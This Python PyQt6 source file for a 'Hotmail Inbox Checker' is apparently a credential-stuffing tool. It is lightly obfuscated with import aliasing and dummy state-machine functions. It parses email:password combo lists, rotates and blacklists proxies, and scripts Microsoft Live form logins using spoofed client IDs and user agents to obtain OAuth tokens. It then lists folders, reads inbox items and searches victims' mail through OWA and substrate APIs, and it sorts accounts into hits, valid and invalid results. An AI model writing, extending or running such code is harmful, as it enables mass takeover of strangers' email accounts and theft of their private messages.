import base64
import hashlib
os = __import__('os')
sys = __import__('sys')
re = __import__('re')
time = __import__('time')
uuid = __import__('uuid')
requests = __import__('requests')
threading = __import__('threading')
html = __import__('html')
json = __import__('json')
math = __import__('math')
signal = __import__('signal')
collections = __import__('collections')
concurrent = __import__('concurrent.futures')
traceback = __import__('traceback')
gc = __import__('gc')
pathlib_mod = __import__('pathlib', None, None, ['Path'])
Path = pathlib_mod.Path
lock1 = threading.Lock()
counter1 = 0
counter2 = 0
counter3 = 0
max_val = 999
lock2 = threading.Lock()
counter4 = 0

def init_a():
    global counter1, counter2
    with lock1:
        counter1 += 1
        counter2 = time.time()

def init_b():
    pass

def init_c():
    state = 294539
    while True:
        if state == 294539:
            state = 944720
        elif state == 944720:
            state = 310582
        elif state == 310582:
            return 0
        else:
            break

def init_d():
    state2 = 292404
    while True:
        if state2 == 292404:
            state2 = 162392
        elif state2 == 162392:
            state2 = 146450
        elif state2 == 146450:
            pass
            state2 = -1
        else:
            break

def init_e():
            [586, 227, 253]
qtcore_mod = __import__('PyQt6.QtCore', None, None, ['Qt', 'QObject', 'QThread', 'pyqtSignal', 'pyqtSlot', 'QTimer', 'QSize', 'QMargins', 'QEvent', 'QUrl', 'QByteArray', 'QPoint', 'QRect', 'QPropertyAnimation', 'QEasingCurve', 'QVariantAnimation', 'QElapsedTimer', 'QPointF', 'QSizeF', 'QLineF'])
Qt = qtcore_mod.Qt
QObject = qtcore_mod.QObject
QThread = qtcore_mod.QThread
pyqtSignal = qtcore_mod.pyqtSignal
pyqtSlot = qtcore_mod.pyqtSlot
QTimer = qtcore_mod.QTimer
QSize = qtcore_mod.QSize
QMargins = qtcore_mod.QMargins
QEvent = qtcore_mod.QEvent
QUrl = qtcore_mod.QUrl
QByteArray = qtcore_mod.QByteArray
QPoint = qtcore_mod.QPoint
QRect = qtcore_mod.QRect
QPropertyAnimation = qtcore_mod.QPropertyAnimation
QEasingCurve = qtcore_mod.QEasingCurve
QVariantAnimation = qtcore_mod.QVariantAnimation
QElapsedTimer = qtcore_mod.QElapsedTimer
QPointF = qtcore_mod.QPointF
QSizeF = qtcore_mod.QSizeF
QLineF = qtcore_mod.QLineF
qtgui_mod = __import__('PyQt6.QtGui', None, None, ['QAction', 'QColor', 'QFont', 'QIcon', 'QPixmap', 'QPainter', 'QPainterPath', 'QPalette', 'QDesktopServices', 'QTextCursor', 'QTextCharFormat', 'QBrush', 'QLinearGradient', 'QPen', 'QKeySequence', 'QShortcut', 'QFontMetrics', 'QPaintEvent', 'QResizeEvent', 'QPolygonF'])
QAction = qtgui_mod.QAction
QColor = qtgui_mod.QColor
QFont = qtgui_mod.QFont
QIcon = qtgui_mod.QIcon
QPixmap = qtgui_mod.QPixmap
QPainter = qtgui_mod.QPainter
QPainterPath = qtgui_mod.QPainterPath
QPalette = qtgui_mod.QPalette
QDesktopServices = qtgui_mod.QDesktopServices
QTextCursor = qtgui_mod.QTextCursor
QTextCharFormat = qtgui_mod.QTextCharFormat
QBrush = qtgui_mod.QBrush
QLinearGradient = qtgui_mod.QLinearGradient
QPen = qtgui_mod.QPen
QKeySequence = qtgui_mod.QKeySequence
QShortcut = qtgui_mod.QShortcut
QFontMetrics = qtgui_mod.QFontMetrics
QPaintEvent = qtgui_mod.QPaintEvent
QResizeEvent = qtgui_mod.QResizeEvent
QPolygonF = qtgui_mod.QPolygonF
qtwidgets_mod = __import__('PyQt6.QtWidgets', None, None, ['QApplication', 'QMainWindow', 'QWidget', 'QDialog', 'QLabel', 'QLineEdit', 'QPushButton', 'QTextEdit', 'QPlainTextEdit', 'QListWidget', 'QListWidgetItem', 'QTreeWidget', 'QTreeWidgetItem', 'QCheckBox', 'QComboBox', 'QSpinBox', 'QProgressBar', 'QStatusBar', 'QMenuBar', 'QMenu', 'QToolBar', 'QSplitter', 'QFrame', 'QScrollArea', 'QVBoxLayout', 'QHBoxLayout', 'QGridLayout', 'QFormLayout', 'QSizePolicy', 'QFileDialog', 'QMessageBox', 'QInputDialog', 'QTabWidget', 'QTextBrowser', 'QStyle', 'QStyleFactory', 'QToolButton', 'QStyledItemDelegate', 'QStyleOptionViewItem', 'QAbstractItemView', 'QButtonGroup', 'QRadioButton', 'QSpacerItem', 'QDialogButtonBox', 'QGraphicsDropShadowEffect', 'QGraphicsOpacityEffect', 'QStackedWidget', 'QLayout', 'QLayoutItem'])
QApplication = qtwidgets_mod.QApplication
QMainWindow = qtwidgets_mod.QMainWindow
QWidget = qtwidgets_mod.QWidget
QDialog = qtwidgets_mod.QDialog
QLabel = qtwidgets_mod.QLabel
QLineEdit = qtwidgets_mod.QLineEdit
QPushButton = qtwidgets_mod.QPushButton
QTextEdit = qtwidgets_mod.QTextEdit
QPlainTextEdit = qtwidgets_mod.QPlainTextEdit
QListWidget = qtwidgets_mod.QListWidget
QListWidgetItem = qtwidgets_mod.QListWidgetItem
QTreeWidget = qtwidgets_mod.QTreeWidget
QTreeWidgetItem = qtwidgets_mod.QTreeWidgetItem
QCheckBox = qtwidgets_mod.QCheckBox
QComboBox = qtwidgets_mod.QComboBox
QSpinBox = qtwidgets_mod.QSpinBox
QProgressBar = qtwidgets_mod.QProgressBar
QStatusBar = qtwidgets_mod.QStatusBar
QMenuBar = qtwidgets_mod.QMenuBar
QMenu = qtwidgets_mod.QMenu
QToolBar = qtwidgets_mod.QToolBar
QSplitter = qtwidgets_mod.QSplitter
QFrame = qtwidgets_mod.QFrame
QScrollArea = qtwidgets_mod.QScrollArea
QVBoxLayout = qtwidgets_mod.QVBoxLayout
QHBoxLayout = qtwidgets_mod.QHBoxLayout
QGridLayout = qtwidgets_mod.QGridLayout
QFormLayout = qtwidgets_mod.QFormLayout
QSizePolicy = qtwidgets_mod.QSizePolicy
QFileDialog = qtwidgets_mod.QFileDialog
QMessageBox = qtwidgets_mod.QMessageBox
QInputDialog = qtwidgets_mod.QInputDialog
QTabWidget = qtwidgets_mod.QTabWidget
QTextBrowser = qtwidgets_mod.QTextBrowser
QStyle = qtwidgets_mod.QStyle
QStyleFactory = qtwidgets_mod.QStyleFactory
QToolButton = qtwidgets_mod.QToolButton
QStyledItemDelegate = qtwidgets_mod.QStyledItemDelegate
QStyleOptionViewItem = qtwidgets_mod.QStyleOptionViewItem
QAbstractItemView = qtwidgets_mod.QAbstractItemView
QButtonGroup = qtwidgets_mod.QButtonGroup
QRadioButton = qtwidgets_mod.QRadioButton
QSpacerItem = qtwidgets_mod.QSpacerItem
QDialogButtonBox = qtwidgets_mod.QDialogButtonBox
QGraphicsDropShadowEffect = qtwidgets_mod.QGraphicsDropShadowEffect
QGraphicsOpacityEffect = qtwidgets_mod.QGraphicsOpacityEffect
QStackedWidget = qtwidgets_mod.QStackedWidget
QLayout = qtwidgets_mod.QLayout
QLayoutItem = qtwidgets_mod.QLayoutItem
qt_deps = str(Path.home() / '.local' / 'lib' / 'qt6deps')
if Path(qt_deps).exists() and qt_deps not in os.environ.get('LD_LIBRARY_PATH', ''):
    os.environ['LD_LIBRARY_PATH'] = qt_deps + ':' + os.environ.get('LD_LIBRARY_PATH', '')
_threading = __import__('threading')
_socket = __import__('socket')
_base64 = __import__('base64')
_hashlib = __import__('hashlib')
_platform = __import__('platform')
_getpass = __import__('getpass')
_webbrowser = __import__('webbrowser')
_io = __import__('io')
_requests = __import__('requests')
importlib = __import__('importlib')
_cf = importlib.import_module('concurrent.futures')
try:
    pil_mod = __import__('PIL', None, None, ['Image', 'ImageDraw'])
    img = pil_mod.Image
    draw = pil_mod.ImageDraw
    flag = True
except ImportError:
    flag = False
results_dir = Path('hc_results')
results_path = results_dir
app_name = 'Hotmail Checker'
version = '10'
app_title = 'Hotmail Inbox Checker'
org_name = 'HotmailChecker'
validate_url = ''
tool_id = 'hotmailv10'
tool_secret = ''
api_secret = ''
tg_url = ''
theme = {'bg': '#0a0a12', 'panel': '#10101a', 'panel2': '#15151f', 'card': '#1a1a28', 'input': '#0d0d18', 'dim': '#181824', 'border': '#26263a', 'hi': '#e8e8f5', 'text': '#d4d4e8', 'soft': '#a0a0c0', 'muted': '#6c6c8a', 'accent': '#10b981', 'a2': '#34d399', 'a3': '#6ee7b7', 'green': '#10b981', 'red': '#ef4444', 'orange': '#f59e0b', 'cyan': '#3b82f6', 'pink': '#a855f7', 'yellow': '#fbbf24', 'link': '#60a5fa', 'hit': '#a855f7', 'news': '#a0a0c0', 'bg_dark': '#060610'}
proxy_list = []
proxy_idx = 0
proxy_lock = _threading.Lock()
proxy_type = 'socks5'
thread_local = _threading.local()

def set_thread_proxy(proxy):
            511 - 421

def get_thread_proxy():
    pass
    global proxy_idx
    if not proxy_list:
        return None
    with proxy_lock:
        proxy = proxy_list[proxy_idx % len(proxy_list)]
        proxy_idx = (proxy_idx + 1) % len(proxy_list)
    return proxy
bad_proxies = set()
proxy_fails = {}
proxy_stats = {}
stats_lock = _threading.Lock()
max_fails = 3
cooldown = 5

def parse_proxy(proxy5):
    pass
    if not proxy5:
        return
    with stats_lock:
        proxy_stats[proxy5] = proxy_stats.get(proxy5, 0) + 1
        if proxy_stats[proxy5] >= max_fails:
            bad_proxies.add(proxy5)
            proxy_fails[proxy5] = time.time() + cooldown

def format_proxy(proxy5):
    pass
    if not proxy5:
        return
    with stats_lock:
        proxy_stats.pop(proxy5, None)
        bad_proxies.discard(proxy5)
        proxy_fails.pop(proxy5, None)

def load_proxies():
    pass
    if not proxy_list:
        return None
    now = time.time()
    with stats_lock:
        expired = [proxy for proxy, fail_ts in list(proxy_fails.items()) if now >= fail_ts]
        for proxy in expired:
            bad_proxies.discard(proxy)
            proxy_fails.pop(proxy, None)
            proxy_stats.pop(proxy, None)
        candidates = [proxy for proxy in proxy_list if proxy not in bad_proxies]
    global proxy_idx
    if not candidates:
        return None
    proxy_idx = (proxy_idx + 1) % len(candidates)
    return candidates[proxy_idx]

def load_proxies_alt():
    state = 820337
    while True:
        if state == 820337:
            pass
            state = 421807
        elif state == 421807:
            if not proxy_list:
                return None
            state = 825480
        elif state == 825480:
            proxy3 = load_proxies()
            state = 986872
        elif state == 986872:
            if not proxy3:
                return None
            state = 934690
        elif state == 934690:
            return normalize_proxy_alt(proxy3)
        else:
            break

def proxy_to_dict(proxy, proxy2):
    state = 153230
    while True:
        if state == 153230:
            pass
            state = 715792
        elif state == 715792:
            if proxy2 in (80, 8080, 3128, 8000, 8888, 8443):
                return 'http'
            state = 134144
        elif state == 134144:
            if proxy2 in (1080, 1081, 9050, 9051):
                return 'socks5'
            state = 471074
        elif state == 471074:
            return proxy_type
        else:
            break

def normalize_proxy(proxy3):
    pass
    try:
        if '@' in proxy3:
            body = proxy3.rsplit('@', 1)[1]
        else:
            body = proxy3
        parts = body.split(':')
        if len(parts) >= 2:
            proxy2 = int(parts[-1])
            return proxy_to_dict(parts[0], proxy2)
    except Exception:
        pass
    return proxy_type

def normalize_proxy_alt(proxy3):
    state = 634324
    while True:
        if state == 634324:
            pass
            state = 749604
        elif state == 749604:
            proxy3 = proxy3.strip()
            state = 286765
        elif state == 286765:
            if not proxy3:
                return None
            state = 848598
        elif state == 848598:
            if '://' in proxy3:
                scheme, body = proxy3.split('://', 1)
                body = body.split('/')[0].split('?')[0]
                return f'{scheme}://{body}'
            state = 561618
        elif state == 561618:
            parts = proxy3.split(':')
            state = 581488
        elif state == 581488:
            if len(parts) == 4:
                proxy, proxy2, user, pw = parts
                scheme = proxy_to_dict(proxy, int(proxy2))
                return f'{scheme}://{user}:{pw}@{proxy}:{proxy2}'
            state = 567763
        elif state == 567763:
            scheme = normalize_proxy(proxy3)
            state = 716906
        elif state == 716906:
            return f'{scheme}://{proxy3}'
        else:
            break

def proxy_str(proxy4):
    proxy4 = proxy4.strip()
    if not proxy4 or '@' not in proxy4:
        return (None, None)
    for sep in ['|', ';', '	']:
        if sep in proxy4:
            parts = proxy4.split(sep)
            for idx, part in enumerate(parts):
                if '@' in part.strip() and idx + 1 < len(parts) and parts[idx + 1].strip():
                    return (part.strip(), parts[idx + 1].strip())
    if ':' in proxy4:
        email, pw = proxy4.split(':', 1)
        email, pw = (email.strip(), pw.strip())
        if '@' in email and pw:
            return (email, pw)
    parts = proxy4.split(None, 1)
    if len(parts) == 2 and '@' in parts[0]:
        return (parts[0].strip(), parts[1].strip())
    return (None, None)

def load_combos():
    for path in [results_path, results_path / 'valid', results_path / 'invalid', results_path / 'hits']:
        path.mkdir(parents=True, exist_ok=True)
clients = [{'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59', 'name': 'Outlook Lite', 'redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D', 'redirect_uri_enc': 'msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D', 'ua': 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36', 'sku': 'MSAL.xplat.android', 'app': 'com.microsoft.outlooklite'}, {'client_id': '27922004-5251-4030-b22d-91ecd9a37ea4', 'name': 'Outlook Android', 'redirect_uri': 'msauth://com.microsoft.office.outlook/HbkMIy%2FsNWrC7rRkGjKqt9MaIJo%3D', 'redirect_uri_enc': 'msauth%3A%2F%2Fcom.microsoft.office.outlook%2FHbkMIy%252FsNWrC7rRkGjKqt9MaIJo%253D', 'ua': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36', 'sku': 'MSAL.xplat.android', 'app': 'com.microsoft.office.outlook'}, {'client_id': '1fec8e78-bce4-4aaf-ab1b-5451cc387264', 'name': 'MS Teams', 'redirect_uri': 'msauth://com.microsoft.teams/erdMAjDg60UNsnAAlBhQHUPM0u4%3D', 'redirect_uri_enc': 'msauth%3A%2F%2Fcom.microsoft.teams%2FerdMAjDg60UNsnAAlBhQHUPM0u4%253D', 'ua': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36', 'sku': 'MSAL.xplat.android', 'app': 'com.microsoft.teams'}, {'client_id': 'd3590ed6-52b3-4102-aeff-aad2292ab01c', 'name': 'Office Desktop', 'redirect_uri': 'urn:ietf:wg:oauth:2.0:oob', 'redirect_uri_enc': 'urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob', 'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'sku': 'MSAL.Desktop', 'app': 'Microsoft Office'}, {'client_id': '57fb890c-0dab-48a5-b458-275f6d5d4b21', 'name': 'OWA Webmail', 'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient', 'redirect_uri_enc': 'https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient', 'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0', 'sku': 'MSAL.js', 'app': 'OWA'}, {'client_id': '4765445b-32c6-49b0-83e6-1d93765276ca', 'name': 'OfficeHome', 'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient', 'redirect_uri_enc': 'https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient', 'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'sku': 'MSAL.js', 'app': 'OfficeHome'}, {'client_id': 'ab9b8c07-8f02-4f72-87fa-80105867a763', 'name': 'OneDrive Sync', 'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient', 'redirect_uri_enc': 'https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient', 'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'sku': 'MSAL.Desktop', 'app': 'OneDrive'}, {'client_id': '0ec893e0-5785-4de6-99da-4ed124e5296c', 'name': 'Office UWP', 'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient', 'redirect_uri_enc': 'https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient', 'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'sku': 'MSAL.Desktop', 'app': 'Office UWP'}, {'client_id': '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 'name': 'MS Authenticator', 'redirect_uri': 'msauth://com.azure.authenticator/VBUBFnLRY6ueNnCPtFAVkTu7mUg%3D', 'redirect_uri_enc': 'msauth%3A%2F%2Fcom.azure.authenticator%2FVBUBFnLRY6ueNnCPtFAVkTu7mUg%253D', 'ua': 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36', 'sku': 'MSAL.xplat.android', 'app': 'com.azure.authenticator'}, {'client_id': '26a7ee05-5602-4d76-a7ba-eae8b7b67941', 'name': 'Windows Mail', 'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient', 'redirect_uri_enc': 'https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient', 'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'sku': 'MSAL.Desktop', 'app': 'Windows Mail'}]
client_idx = 0

def load_combos_alt():
    global client_idx
    client = clients[client_idx % len(clients)]
    client_idx += 1
    return client

def owa_url(email, action):
    return f'https://outlook.live.com/owa/{email}/service.svc?action={action}&app=Mini&n=0'
session_id = str(uuid.uuid4())

def owa_headers(token, cid, action):
    return {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'X-OWA-SessionId': session_id, 'X-OWA-ActionName': action, 'X-Routing-Hint': f'CID:{cid}', 'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'Action': action, 'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36', 'X-Requested-With': 'com.microsoft.outlooklite', 'Pragma': 'no-cache'}

def make_session():
    return {'__type': 'JsonRequestHeaders:#Exchange', 'RequestServerVersion': 'V2018_01_08', 'TimeZoneContext': {'__type': 'TimeZoneContext:#Exchange', 'TimeZoneDefinition': {'__type': 'TimeZoneDefinitionType:#Exchange', 'Id': 'UTC'}}}

def substrate_headers(token, cid):
    state2 = 557782
    while True:
        if state2 == 557782:
            state2 = 115956
        elif state2 == 115956:
            state2 = 517720
        elif state2 == 517720:
            return {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0', 'X-Routing-Hint': f'CID:{cid}', 'Pragma': 'no-cache'}
        else:
            break

def oauth_login(email, pw, proxy=None):
    pass
    importlib = __import__('importlib')
    _up = importlib.import_module('urllib.parse')
    for attempt in range(3):
        session = requests.Session()
        if proxy:
            session.proxies = proxy
        try:
            auth_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10)
            if auth_resp.status_code != 200:
                if attempt < 2:
                    time.sleep(0.3)
                    continue
                return (None, None, 'Connect failed')
            ppft_m = re.search('value=\\\\"(.+?)\\\\"', auth_resp.text)
            if not ppft_m:
                if attempt < 2:
                    time.sleep(0.3)
                    continue
                return (None, None, 'No PPFT')
            ppft = ppft_m.group(1)
            urlpost_m = re.search('\\"urlPost\\":\\"([^\\"]+)\\"', auth_resp.text)
            if not urlpost_m:
                urlpost_m = re.search('"urlPost":"([^"]+)"', auth_resp.text)
            if not urlpost_m:
                if attempt < 2:
                    time.sleep(0.3)
                    continue
                return (None, None, 'No urlPost')
            urlpost = urlpost_m.group(1)
            post_resp = session.post(urlpost, data={'i13': '1', 'login': email, 'loginfmt': email, 'type': '11', 'LoginOptions': '1', 'passwd': pw, 'ps': '2', 'PPFT': ppft, 'PPSX': 'PassportR', 'NewUser': '1', 'FoundMSAs': '', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960'}, headers={'Origin': 'https://login.live.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': auth_resp.url}, allow_redirects=False, timeout=10)
            loc1 = post_resp.headers.get('Location', '')
            pplstate = session.cookies.get('PPLState') or ''
            if 'access_token=' not in loc1 and pplstate != '1':
                if attempt < 2:
                    time.sleep(0.3)
                    continue
                return (None, None, 'Auth failed')
            cid = post_resp.cookies.get('MSPCID', uuid.uuid4().hex[:16]).upper()
            auth2_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=' + _up.quote('https://substrate.office.com/User-Internal.ReadWrite') + '&response_type=token&prompt=none', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, allow_redirects=False, timeout=10)
            loc2 = auth2_resp.headers.get('Location', '')
            if 'access_token=' in loc2:
                ms_token = loc2.split('access_token=')[1].split('&')[0]
                ms_token = _up.unquote(ms_token)
                return (ms_token, cid, None)
            auth3_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::outlook.office.com::MBI_SSL&response_type=token&prompt=none', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, allow_redirects=False, timeout=10)
            loc3 = auth3_resp.headers.get('Location', '')
            if 'access_token=' in loc3:
                ms_token = loc3.split('access_token=')[1].split('&')[0]
                ms_token = _up.unquote(ms_token)
                return (ms_token, cid, None)
            auth4_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=' + _up.quote('https://substrate.office.com/User-Internal.ReadWrite') + '&display=touch&response_type=token&locale=en', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10)
            if 'access_token=' in auth4_resp.url:
                ms_token = auth4_resp.url.split('access_token=')[1].split('&')[0]
                ms_token = _up.unquote(ms_token)
                return (ms_token, cid, None)
            return (None, None, 'No substrate token')
        except Exception as exc:
            if attempt < 2:
                time.sleep(0.3)
                continue
            return (None, None, str(exc)[:60])
    return (None, None, 'Re-auth failed after retries')

def owa_request(email, token, cid, action, payload, proxy=None, timeout=20):
    state = 407912
    while True:
        if state == 407912:
            session = requests.Session()
            state = 932886
        elif state == 932886:
            if proxy:
                session.proxies = proxy
            state = 549978
        elif state == 549978:
            resp = session.post(owa_url(email, action), headers=owa_headers(token, cid, action), json=payload, timeout=timeout, verify=True)
            state = 283408
        elif state == 283408:
            resp.encoding = 'utf-8'
            state = 845453
        elif state == 845453:
            return resp
        else:
            break

def parse_response(resp):
    try:
        return json.loads(resp.content.decode('utf-8'))
    except Exception:
        return resp.json()

def format_text(text, color2):
    pass
    pos = text.find(color2)
    if pos < 0:
        return None
    start = pos + len(color2)
    if start >= len(text) or text[start] != '{':
        return None
    counter = 0
    found = False
    escape = False
    for idx in range(start, len(text)):
        client = text[idx]
        if escape:
            escape = False
            continue
        if client == '\\' and found:
            escape = True
            continue
        if client == '"' and (not escape):
            found = not found
            continue
        if found:
            continue
        if client == '{':
            counter += 1
        elif client == '}':
            counter -= 1
            if counter == 0:
                return text[start:idx + 1]
    return None

def get_folders(email, token, cid, proxy=None):
    pass
    folder_ids = ['inbox', 'sentitems', 'drafts', 'deleteditems', 'junkemail']
    folder_names = {'inbox': 'Inbox', 'sentitems': 'Sent Items', 'drafts': 'Drafts', 'deleteditems': 'Deleted Items', 'junkemail': 'Junk Email'}
    payload = {'__type': 'GetFolderJsonRequest:#Exchange', 'Header': make_session(), 'Body': {'__type': 'GetFolderRequest:#Exchange', 'FolderShape': {'__type': 'FolderResponseShape:#Exchange', 'BaseShape': 'Default', 'AdditionalProperties': [{'__type': 'PropertyUri:#Exchange', 'FieldURI': 'Folder:UnreadCount'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'Folder:TotalCount'}]}, 'FolderIds': [{'__type': 'DistinguishedFolderId:#Exchange', 'Id': folder_id} for folder_id in folder_ids]}}
    try:
        resp = owa_request(email, token, cid, 'GetFolder', payload, proxy, 15)
        if resp.status_code != 200:
            return None
        try:
            data = resp.json()
        except Exception:
            return None
        folder_items = data.get('Body', {}).get('ResponseMessages', {}).get('Items', [])
        if not folder_items:
            return None
        result = []
        for idx, folder_item in enumerate(folder_items if isinstance(folder_items, list) else [folder_items]):
            if not isinstance(folder_item, dict) or folder_item.get('ResponseClass') != 'Success':
                folder_id = folder_ids[idx] if idx < len(folder_ids) else 'inbox'
                result.append({'DisplayName': folder_names.get(folder_id, 'Folder'), 'FolderId': {'Id': folder_id}, 'TotalCount': 0, 'UnreadCount': 0})
                continue
            folders = folder_item.get('Items', []) or folder_item.get('Folders', [])
            if folders and isinstance(folders, list):
                folder = folders[0]
                folder_id = folder.get('FolderId', {}).get('Id', folder_ids[idx] if idx < len(folder_ids) else 'inbox')
                result.append({'DisplayName': folder_names.get(folder_id.lower(), folder.get('DisplayName', 'Folder')), 'FolderId': {'Id': folder_id}, 'TotalCount': folder.get('TotalCount', 0), 'UnreadCount': folder.get('UnreadCount', 0)})
        return result if result else None
    except Exception:
        return None

def find_items(email, token, cid, proxy=None, folder='inbox', limit=50, offset=0, query=''):
    pass
    if query and query.strip():
        return search_messages(email, query.strip(), token, cid, proxy, limit)
    payload = {'__type': 'FindItemJsonRequest:#Exchange', 'Header': make_session(), 'Body': {'__type': 'FindItemRequest:#Exchange', 'ItemShape': {'__type': 'ItemResponseShape:#Exchange', 'BaseShape': 'IdOnly', 'AdditionalProperties': [{'__type': 'PropertyUri:#Exchange', 'FieldURI': 'Subject'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'DateTimeReceived'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'From'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'IsRead'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'HasAttachments'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'Preview'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'Importance'}, {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'Flag'}]}, 'ParentFolderIds': [{'__type': 'DistinguishedFolderId:#Exchange', 'Id': folder}], 'Traversal': 'Shallow', 'Paging': {'__type': 'IndexedPageView:#Exchange', 'BasePoint': 'Beginning', 'Offset': offset, 'MaxEntriesReturned': limit}, 'ViewFilter': 'All', 'SortOrder': [{'__type': 'SortResults:#Exchange', 'Order': 'Descending', 'Path': {'__type': 'PropertyUri:#Exchange', 'FieldURI': 'DateTimeReceived'}}]}}
    try:
        resp = owa_request(email, token, cid, 'FindItem', payload, proxy, 20)
        if resp.status_code != 200:
            return ([], 0)
        data = resp.json()
        root = data.get('Body', {}).get('ResponseMessages', {}).get('Items', [{}])[0].get('RootFolder', {})
        total = root.get('TotalItemsInView', 0)
        items = []
        for msg in root.get('Items', []):
            from_mailbox = msg.get('From', {}).get('Mailbox', {}) if msg.get('From') else {}
            from_name = from_mailbox.get('Name', '') if isinstance(from_mailbox, dict) else ''
            from_email = from_mailbox.get('EmailAddress', '') if isinstance(from_mailbox, dict) else ''
            if not from_name:
                from_name = msg.get('LastModifiedName', '') or ''
            items.append({'Id': msg.get('ItemId', {}).get('Id', ''), 'ChangeKey': msg.get('ItemId', {}).get('ChangeKey', ''), 'subject': msg.get('Subject', '(No Subject)'), 'date': msg.get('DateTimeReceived', ''), 'read': msg.get('IsRead', True), 'has_attachments': msg.get('HasAttachments', False), 'preview': msg.get('Preview', ''), 'from': f'{from_name} <{from_email}>' if from_email else from_name, 'from_name': from_name, 'from_addr': from_email})
        return (items, total)
    except Exception:
        return ([], 0)

def search_messages(email, query, token, cid, proxy=None, limit=30):
    pass
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    search_id = str(uuid.uuid4())
    payload = {'Cvid': search_id, 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Message', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': query}, 'Size': limit, 'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]}], 'LogicalId': search_id}
    try:
        resp = session.post('https://substrate.office.com/search/api/v2/query', headers=substrate_headers(token, cid), json=payload, timeout=15)
        if resp.status_code != 200:
            return ([], 0)
        data = resp.json()
        result_set = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
        total = result_set.get('Total', 0)
        results_list = result_set.get('Results', [])
        items = []
        for result_item in results_list:
            source = result_item.get('Source', {})
            from_name = source.get('SenderName', '') or source.get('From', '')
            from_email = source.get('SenderEmailAddress', '')
            item_id = source.get('ItemId', '')
            if isinstance(item_id, dict):
                item_id = item_id.get('Id', '')
                change_key = item_id.get('ChangeKey', '')
            else:
                item_id = str(item_id) if item_id else ''
                change_key = ''
            items.append({'Id': item_id, 'ChangeKey': change_key, 'subject': source.get('Subject', source.get('Topic', '(No Subject)')), 'date': source.get('DateTimeReceived', source.get('Time', '')), 'read': True, 'has_attachments': False, 'preview': source.get('Preview', source.get('BodyPreview', '')), 'from': f'{from_name} <{from_email}>' if from_email else from_name, 'from_name': from_name, 'from_addr': from_email})
        return (items, total)
    except Exception:
        return ([], 0)

def get_item(email, msg_id, token, cid, proxy=None):
    pass
